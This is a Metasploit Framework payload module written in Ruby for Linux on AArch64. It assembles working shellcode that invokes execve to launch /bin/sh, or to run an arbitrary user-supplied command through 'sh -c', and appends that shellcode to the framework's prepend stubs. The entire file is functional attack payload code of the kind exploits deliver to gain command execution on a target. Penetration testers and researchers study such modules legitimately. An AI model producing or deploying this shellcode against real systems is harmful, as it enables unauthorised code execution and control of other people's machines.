##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 64

  include Msf::Payload::Single
  include Msf::Payload::Linux::Aarch64::Prepends

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Execute Command',
        'Description' => 'Execute an arbitrary command or just a /bin/sh shell',
        'Author' => 'Spencer McIntyre',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_AARCH64
      )
    )

    register_options([
      OptString.new('CMD', [ false, 'The command string to execute' ]),
    ])
  end

  def generate(_opts = {})
    cmd = datastore['CMD'] || ''

    if cmd.empty?
      # execve("/bin/sh", NULL, NULL)
      shellcode = [
        0x100000a0, # adr x0, sh_str
        0xd2800001, # mov x1, #0
        0xd2800002, # mov x2, #0
        0xd2801ba8, # mov x8, #0xdd # __NR_execve
        0xd4000001  # svc #0
      ].pack('V*')
      shellcode += "/bin/sh\x00"
    else
      # execve("/bin/sh", ["/bin/sh", "-c", CMD, NULL], NULL)
      shellcode = [
        0x10000160, # adr x0, sh_str
        0x10000189, # adr x9, c_str
        0x1000018a, # adr x10, cmd_str
        0xf90003e0, # str x0, [sp, #0]   ; argv[0] = "/bin/sh"
        0xf90007e9, # str x9, [sp, #8]   ; argv[1] = "-c"
        0xf9000bea, # str x10, [sp, #16] ; argv[2] = CMD
        0xf9000fff, # str xzr, [sp, #24] ; argv[3] = NULL
        0x910003e1, # mov x1, sp
        0xd2800002, # mov x2, #0
        0xd2801ba8, # mov x8, #0xdd # __NR_execve
        0xd4000001  # svc #0
      ].pack('V*')
      shellcode += "/bin/sh\x00"
      shellcode += "-c\x00\x00"
      shellcode += cmd + "\x00"
    end

    # align our shellcode to 4 bytes
    shellcode += "\x00" while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
